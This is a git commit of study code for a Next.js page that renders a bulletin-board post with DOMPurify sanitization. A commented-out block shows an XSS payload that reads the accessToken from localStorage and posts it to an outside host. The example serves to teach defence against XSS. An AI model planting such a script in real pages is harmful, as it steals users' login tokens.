6fe699e1f561c39d3bdb950c16185f7b3e77da25
DumakIt <odumak4411@gmail.com>
2023-02-20 22:33:42 +0900

    웹에디터 및 xss공격, Hydration Issue 공부내역 업데이트

---
+++ class/pages/section27/27-03-web-editor-xss-detail/[qqq]/index.tsx
@@ -0,0 +1,52 @@
+import { gql, useQuery } from "@apollo/client";
+import { useRouter } from "next/router";
+import Dompurify from "dompurify";
+
+const FETCH_BOARD = gql`
+  query fetchBoard($boardId: ID!) {
+    fetchBoard(boardId: $boardId) {
+      _id
+      writer
+      title
+      contents
+    }
+  }
+`;
+
+export default function StaticRoutingMovedPage(): JSX.Element {
+  const router = useRouter();
+
+  const { data } = useQuery(FETCH_BOARD, {
+    variables: {
+      boardId: router.query.qqq,
+    },
+  });
+
+  return (
+    <div>
+      {/* <div>{router.query.qqq}번 게시글로 이동이 완료되었습니다.</div> */}
+      <div>작성자: {data?.fetchBoard?.writer}</div>
+      <div>제목: {data?.fetchBoard?.title}</div>
+      {/* <div>내영: {data?.fetchBoard?.contents}</div> */}
+
+      {/* <div
+        dangerouslySetInnerHTML={{
+          __html: `
+              <script>
+                const qqq = localStorage.getItem("accessToken")
+                axios.post("http://mybackerbackend.com/mydata", {data: qqq})
+              </script>
+          `,
+        }}
+      /> */}
+
+      {typeof window !== "undefined" && (
+        <div
+          dangerouslySetInnerHTML={{
+            __html: Dompurify.sanitize(data?.fetchBoard?.contents),
+          }}
+        />
+      )}
+    </div>
+  );
+}
